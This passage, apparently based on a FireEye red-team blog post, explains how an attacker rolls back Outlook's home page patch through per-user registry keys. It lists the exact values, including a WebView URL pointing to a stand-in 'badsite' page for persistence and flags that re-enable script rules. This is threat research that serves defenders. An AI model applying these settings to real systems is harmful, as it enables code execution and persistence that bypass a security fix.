## Rolling back the patch
- https://www.fireeye.com/blog/threat-research/2019/12/breaking-the-rules-tough-outlook-for-home-page-attacks.html
An attacker can set a home page to achieve code execution and persistence by editing the WebView registry keys. The “URL” subkey will enable and set a home page for the specified mail folder within the default mailbox. Setting this registry key to a valid URL enables the home page regardless of the patch being applied or not. Although the option will not be accessible from the Outlook user interface (UI), it will still be set and render. Importantly, these keys are set within the logged-on user’s Registry hive. This means that no special privileges are required to edit the Registry and roll back the patch. The FireEye Red Team found that no other registry modifications were required to set a malicious Outlook homepage.
```
HKEY_CURRENT_USER\Software\Microsoft\Office\<Outlook Version>\ Outlook\WebView\Inbox
“URL”= http://badsite/homepage-persist.html
```
There are additional keys within the Registry that can be modified to further roll back the patch and expose unsafe options in Outlook. The following setting can be used to re-enable the original home page tab and roaming home page behavior in the Outlook UI.
```
HKEY_CURRENT_USER\Software\Microsoft\Office\<Outlook Version>\Outlook\Security
“EnableRoamingFolderHomepages”= dword:00000001
```
The following setting will allow for folders within secondary (non-default) mailboxes to leverage a custom home page.
```
HKEY_CURRENT_USER\Software\Microsoft\Office\<Outlook Version>\Outlook\Security
“NonDefaultStoreScript"= dword:00000001
```
The following setting will allow for “Run as a Script” and “Start Application” rules to be re-enabled.
```
HKEY_CURRENT_USER\Software\Microsoft\Office\<Outlook Version>\Outlook\Security
“EnableUnsafeClientMailRules"= dword:00000001
```
